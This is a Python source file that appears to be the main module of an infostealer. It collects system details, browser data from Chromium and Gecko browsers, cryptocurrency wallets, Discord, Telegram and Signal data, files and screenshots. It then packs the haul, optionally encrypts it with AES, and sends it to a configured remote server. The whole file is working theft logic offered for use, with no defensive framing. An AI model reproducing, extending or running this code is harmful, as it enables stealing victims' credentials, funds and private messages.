import os
import sys
import json
import time
import uuid
import platform
import base64

from config import AgentConfig
from browser.chromium import extract_chromium_all
from browser.gecko import extract_gecko_all
from crypto.wallets import extract_all as extract_wallets
from messengers.discord import extract_discord_info
from messengers.telegram import extract_all as extract_telegram
from messengers.signal import extract_all as extract_signal
from grabber.files import find_files
from grabber.screenshot import capture
from crypt.aes import AESCipher
from exfil.http import send


def get_system_info() -> dict:
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "username": os.environ.get("USERNAME", ""),
        "userdomain": os.environ.get("USERDOMAIN", ""),
        "cpu": platform.processor(),
        "install_id": str(uuid.uuid4()),
        "timestamp": time.time(),
    }


def collect(config: AgentConfig) -> dict:
    payload = {"system": get_system_info(), "modules": {}}

    if config.modules.get("browsers", True):
        payload["modules"]["browsers"] = {
            "chromium": extract_chromium_all(),
            "gecko": extract_gecko_all(),
        }

    if config.modules.get("wallets", True):
        payload["modules"]["wallets"] = extract_wallets()

    if config.modules.get("messengers", True):
        payload["modules"]["discord"] = extract_discord_info()
        payload["modules"]["telegram"] = extract_telegram()
        payload["modules"]["signal"] = extract_signal()

    if config.modules.get("files", True):
        payload["modules"]["files"] = find_files(config.file_extensions, config.max_file_size)

    if config.modules.get("screenshots", True):
        payload["modules"]["screenshot"] = capture(config.screenshot_delay)

    return payload


def encrypt_payload(payload: dict, aes_key: str) -> str:
    cipher = AESCipher(aes_key.encode())
    raw = json.dumps(payload, default=str, ensure_ascii=False).encode("utf-8")
    encrypted = cipher.encrypt(raw)
    return base64.b64encode(encrypted).decode()


def main():
    config = AgentConfig.load()
    raw = collect(config)

    encrypted = encrypt_payload(raw, config.aes_key) if config.aes_key else json.dumps(raw, default=str, ensure_ascii=False)

    payload = {
        "install_token": config.install_token,
        "system": raw["system"],
        "data": encrypted,
        "encrypted": bool(config.aes_key),
        "aes_key": config.aes_key if config.aes_key else "",
    }

    send(config.server_url, config.install_token, payload, config.proxy, config.exfil_timeout)


if __name__ == "__main__":
    main()
